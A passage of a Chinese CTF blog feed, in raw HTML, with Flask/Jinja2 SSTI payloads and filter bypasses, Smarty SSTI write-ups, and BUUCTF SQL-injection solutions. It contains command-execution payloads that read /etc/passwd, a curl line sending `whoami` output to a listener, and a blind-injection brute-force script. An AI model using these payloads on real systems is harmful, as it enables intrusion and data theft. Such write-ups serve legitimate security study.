punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token comment">#windows下的os命令</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一些常用的绕过方式"><a href="#一些常用的绕过方式" class="headerlink" title="一些常用的绕过方式"></a>一些常用的绕过方式</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤["></a>过滤[</h3><pre class="line-numbers language-none"><code class="language-none">#getitem、pop&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#chr函数</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> <span class="token builtin">chr</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">chr</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">119</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#request对象</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>path<span class="token operator">=</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span class="token comment">#命令执行</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> <span class="token builtin">chr</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">chr</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>cmd<span class="token operator">=</span><span class="token builtin">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>mro<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>subclasses<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span><span class="token keyword">class</span><span class="token operator">=</span>__class__<span class="token operator">&amp;</span>mro<span class="token operator">=</span>__mro__<span class="token operator">&amp;</span>subclasses<span class="token operator">=</span>__subclasses__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#用&#123;%%&#125;标记</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'curl http://127.0.0.1:7999/?i=`whoami`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'p'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token number">1</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>tplmap这个工具也是非常好用的</strong></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="Smarty-SSTI利用"><a href="#Smarty-SSTI利用" class="headerlink" title="Smarty SSTI利用"></a>Smarty SSTI利用</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./libs/Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"pass a parameter and maybe the flag file's filename is random :>"</span><span class="token punctuation">;</span><span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">AS</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|\/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./template.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/system|readfile|gz|exec|eval|cat|assert|file|fgets/i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./template.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"eval:"</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令</p><p>这题随便传一个参数<code>?a=&#123;phpinfo()&#125;</code>发现可以执行成功</p><p>审查代码发现过滤了exec和eval</p><p>所以只能用passthru执行命令了<code>?a=&#123;passthru(&#39;tac /_21372&#39;)&#125;</code></p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210312093525180.png"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210312093620319.png"></p><p>根据提示，可以试试修改X-Forwarded-For或者是client-ip，试了一下发现存在模板注入，直接调用系统命令就可以查看flag了</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210312093807486.png"></p><h3 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h3><p>常规套路，直接找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210310222204046.png"></p><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.67.246.176:18056&#x2F;?flag&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[431].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat &#x2F;app&#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>存在XSS</p><p>根据提示发现存在ssti漏洞</p><p>payload:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用tplmap启动伪终端使用<code>--os-shell</code>直接查看flag</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU做题记录</title>
      <link href="2021/web/buuctf/"/>
      <url>2021/web/buuctf/</url>
      
        <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Hack-World"><a href="#CISCN2019-华北赛区-Hack-World" class="headerlink" title="[CISCN2019 华北赛区]Hack World"></a>[CISCN2019 华北赛区]Hack World</h2><p>输入1或2有回显，而一些常见的注入用的符号或者是字母都会被过滤掉</p><p>初步判断可能是数字型盲注</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 先测试一下</span><span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>ascii<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现注入成功！</p><p>写脚本爆出flag，这里自己写的脚本爆出来的flag有点问题，参考了这位兄弟的文章才改了过来<a href="https://www.jianshu.com/p/8bb7d057365d">XD_whYe</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://3e76dcf4-89d8-4a7d-8a25-926d00a331e3.node3.buuoj.cn/index.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">max</span> <span class="token operator">+</span> <span class="token builtin">min</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">'1^(ascii(substr((select(flag)from(flag)),'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',1))>'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.005</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Hello, glzjin wants a girlfriend.'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> s        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> s        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">max</span> <span class="token operator">-</span> <span class="token builtin">min</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>先试一下一些常见的账号密码，都没用</p><p>空格和=被过滤了，可以用()和like来代替</p><p>这题试了一下应该是报错注入，需要用到<code>^</code>连接函数形成异或</p><p>payload:<code>?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210225090738803.png"></p><p>成功显示数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 爆表</span>?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string">'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('</span>geek<span class="token string">')))))%23-- 爆字段?username=admin&amp;password=admin'</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">like</span><span class="token punctuation">(</span><span class="token string">'H4rDsq1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">-- 爆值</span>?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">-- 这里flag并不是完整的，看了一下网上的说法，可以使用left和right函数分别读取</span>?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">27</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">27</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>随便注册一个用户登录发现有URL中有<code>view.php?no=1</code>no参数，查看用户信息的时候会加载我们填的blog链接，这里存在SSRF漏洞</p><pre class="line-numbers language-none"><code class="language-none">?no&#x3D;1 order by 4 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210225214056503.png"></p><p>这里存在SQL注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 爆表名</span><span class="token operator">/</span><span class="token keyword">view</span><span class="token punctuation">.</span>php?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span class="token comment">-- 爆列名</span><span class="token operator">/</span><span class="token keyword">view</span><span class="token punctuation">.</span>php?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"users"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span class="token comment">-- 数据库里并没有flag,看下data里面是什么，发现是序列化之后的结果</span><span class="token comment">-- 爆字段</span><span class="token operator">/</span><span class="token keyword">view</span><span class="token punctuation">.</span>php?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">data</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 